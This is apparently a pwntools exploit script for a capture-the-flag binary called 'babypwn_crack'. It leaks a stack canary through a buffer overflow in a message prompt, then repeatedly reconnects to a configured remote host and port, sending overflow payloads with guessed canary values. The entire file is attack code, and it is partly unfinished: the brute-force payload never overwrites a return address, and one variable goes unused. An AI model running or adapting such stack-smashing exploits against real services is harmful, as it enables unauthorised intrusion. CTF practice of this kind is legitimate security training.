from pwn import *
import random
import struct
"""===============    Configuration    ================"""

class Exploit():
    def __init__(self):
        self.pwnName = "babypwn_crack"
        self.local = True
        self.host, self.port = '110.10.212.130', 8888
        context.endian = 'little'
        context.arch = 'i386'
        context.os = "linux"
        context.log_level = "ERROR"
        context.terminal = ['tmux', 'splitw', '-h']
        self.binary = ELF(self.pwnName)
        self.connect()
    ################################################
        #sendMessageAddress = 0x08048907
        #recvMessageAddress = 0x080488b1

    def connect(self):
        if self.local:
            self.vp = process(["./" + self.pwnName, " %s"%self.port])
            self.host = "localhost"
            self.r = remote(self.host, self.port)
            #gdb.attach(self.r, execute="b *0x080488b1")

        else:
            self.r = remote(self.host, self.port)

    def menu(self, choice):
        print self.r.recvuntil('> ') + str(choice)
        self.r.sendline(str(choice))
        if choice == 3:
            self.r.close()
            print self.vp.recv()


    def getLeak(self):
        #"Input Your Message : "
        #49 is the lowest amount of a's to get the canary from strlen
        data= 'A'*47 + "BC"
        print self.r.sendafter(': ', str(data)) + str(data)
        leak = self.r.recvline().strip().split('B')[1]

        #first 4 bytes = part of canary
        canary = leak[:4]
        canary = u32(canary)
        canary -= 0x43 # Remove the c
        self.canary = canary

    def bruteForceCanary(self):
        #"Input Your Message : "
        filler = 'A'*49
        overFlow = 'A' *500
        for x  in xrange(0xFF):
            self.r = remote(self.host,self.port)
            self.menu(1)
            payload = filler + p32( self.canary + x) + filler
            print self.r.sendafter(": ", payload)
            self.menu(3)

if __name__ == "__main__":
    exploit = Exploit()
    exploit.menu(1)
    exploit.getLeak()
    exploit.menu(3)
    exploit.bruteForceCanary()



